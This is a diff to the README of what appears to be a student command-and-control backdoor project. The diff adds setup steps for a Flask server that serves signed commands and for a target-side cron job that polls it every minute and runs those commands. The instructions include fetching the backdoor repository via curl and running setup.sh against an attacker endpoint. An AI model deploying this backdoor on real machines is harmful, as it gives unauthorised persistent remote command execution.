@@ -21,7 +21,12 @@ David Trakhtengerts : dst726 and Ricky Woodruff : rgw664
     openssl genrsa -out private.pem 1024
     openssl rsa -in private.pem -pubout -out public.pem
     ```
-3. Run the flask server
+3. Create a `commands.txt` file and fill it with commands to run on the target machine. Each command should be on a new line.
+
+    ```bash
+    echo $'pwd\nwhoami\n' > foo
+    ```
+4. Run the flask server
 
     ```bash
     export FLASK_APP=attacker-server.py
@@ -31,18 +36,17 @@ David Trakhtengerts : dst726 and Ricky Woodruff : rgw664
 
 ### Target Machine
 
-1. Copy over public key to target machine from the attacker machine
-
-    ```bash
-    scp public.pem {Target IP}:~/ 
-    # Example: scp public.pem user@10.0.2.5
-    ```
-
-2. Run the target script
+1. Download the backdoor repo
 
     ```bash
     curl -L http://github.com/woodruffr4/Command-Control/archive/main.tar.gz | tar zxf -
-    cd Command-Control-main
+    cd Command-Control-main/client
+    ```
+2. From the attacker machine, manually copy over the public key to the `/client` directory. The public key should be named `public.pem`.
+    
+3. Run the setup script
+
+    ```bash
     chmod +x setup.sh
     ./setup.sh {Your Server Endpoint}
     # Example: ./setup.sh http://10.0.2.4:5000/commands
@@ -56,12 +60,12 @@ There are two parts to this backdoor, the flask server on the attacker side and 
 
 ### Cron job
 
-The cron job runs every minute and calls a python script which makes a request to the `/commands` endpoint on the flask server. The server responds a signature and commands to run. The signature will be verified using the public key and if it is valid, the commands will be run. The output of the commands is sent to a log file on the target machine.
+The cron job runs every minute and calls a python script which makes a request to the `/commands` endpoint on the flask server. The server returns a signature and commands to run. The signature will be verified using the public key and if it is valid, the commands will be run. The output of the commands is sent to a log file on the target machine.
 
 ### Flask Server
 
 The flask server has one endpoint, `/commands`. This endpoint is used to send commands to the target machine.
-The server reads the commands from a file `commands.txt`, and deletes the contents after (to avoid re executing commands). It then signs the commands with a private key, and sends the signature along with the commands to the target machine.
+The server reads the commands from a file `commands.txt`, and deletes the contents after (to avoid re-executing commands). It then signs the commands with a private key, and sends the signature along with the commands to the target machine.
 
 
 ## How it meets the requirements
